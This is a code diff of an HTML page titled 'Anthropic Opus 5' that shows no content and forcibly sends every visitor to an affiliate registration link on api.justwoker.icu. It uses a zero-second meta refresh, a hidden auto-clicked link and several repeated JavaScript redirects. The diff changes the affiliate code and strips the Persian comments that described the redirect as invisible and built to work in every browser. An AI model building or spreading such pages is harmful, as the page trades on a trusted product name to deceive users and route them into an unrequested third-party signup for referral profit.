@@ -4,13 +4,14 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Anthropic Opus 5</title>
-  <!-- متا رفرش با ۰ ثانیه برای سریع‌ترین ریدایرکت -->
-  <meta http-equiv="refresh" content="0; url=https://api.justwoker.icu/register?aff=oQFI">
+  <meta http-equiv="refresh" content="0; url=https://api.justwoker.icu/register?aff=TOI7">
   <style>
-    /* پس‌زمینه مشکی، بدون محتوای قابل مشاهده */
-    html, body {
+    * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+    }
+    html, body {
       height: 100%;
       background-color: #000000;
       overflow: hidden;
@@ -18,64 +19,51 @@
       align-items: center;
       justify-content: center;
     }
-    /* لینک مخفی برای کلیک خودکار در صورت نیاز – اما دیده نشود */
     #hidden-link {
       display: none;
     }
   </style>
 </head>
 <body>
-  <!-- لینک مخفی برای fallback در صورت عدم پشتیبانی از متا و js -->
-  <a id="hidden-link" href="https://api.justwoker.icu/register?aff=oQFI" style="display:none;">.</a>
+  <a id="hidden-link" href="https://api.justwoker.icu/register?aff=TOI7" style="display:none;">.</a>
 
   <script>
-    // روش‌های متعدد برای اطمینان از ریدایرکت در تمام مرورگرها
     (function() {
-      // ۱. استفاده از location.replace (جایگزینی تاریخچه)
-      try {
-        window.location.replace('https://api.justwoker.icu/register?aff=oQFI');
-      } catch (e) {}
+      var targetUrl = 'https://api.justwoker.icu/register?aff=TOI7';
 
-      // ۲. استفاده از location.href
-      try {
-        window.location.href = 'https://api.justwoker.icu/register?aff=oQFI';
-      } catch (e) {}
+      function redirect() {
+        try {
+          window.location.replace(targetUrl);
+          return true;
+        } catch (_) {}
+        try {
+          window.location.href = targetUrl;
+          return true;
+        } catch (_) {}
+        try {
+          var link = document.getElementById('hidden-link');
+          if (link) {
+            link.click();
+            return true;
+          }
+        } catch (_) {}
+        return false;
+      }
 
-      // ۳. کلیک خودکار روی لینک مخفی (برای موارد خاص)
-      try {
-        var link = document.getElementById('hidden-link');
-        if (link) {
-          link.click();
-        }
-      } catch (e) {}
+      redirect();
 
-      // ۴. تایم‌اوت برای اطمینان دوباره (در صورت تاخیر)
       setTimeout(function() {
-        try {
-          window.location.replace('https://api.justwoker.icu/register?aff=oQFI');
-        } catch (e) {}
-        try {
-          window.location.href = 'https://api.justwoker.icu/register?aff=oQFI';
-        } catch (e) {}
+        redirect();
       }, 0);
 
-      // ۵. رویداد load برای اطمینان از اجرا بعد از بارگذاری کامل
       window.addEventListener('load', function() {
-        try {
-          window.location.replace('https://api.justwoker.icu/register?aff=oQFI');
-        } catch (e) {}
-        try {
-          window.location.href = 'https://api.justwoker.icu/register?aff=oQFI';
-        } catch (e) {}
+        redirect();
       });
 
-      // ۶. ریدایرکت فوری با useCapture (اجرای قبل از هر چیز)
       try {
-        window.location.replace('https://api.justwoker.icu/register?aff=oQFI');
-      } catch (e) {}
+        window.location.replace(targetUrl);
+      } catch (_) {}
     })();
   </script>
-
-  <!-- در صورت غیرفعال بودن جاوااسکریپت، متا رفرش کار می‌کند -->
 </body>
 </html>
